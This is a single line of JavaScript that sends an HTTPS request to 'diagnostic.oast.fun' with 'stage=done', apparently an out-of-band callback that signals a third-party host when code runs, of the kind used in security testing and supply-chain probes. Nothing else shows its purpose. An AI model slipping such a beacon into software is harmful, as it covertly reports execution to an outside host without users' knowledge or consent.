https.get("https://diagnostic.oast.fun/report?stage=done");
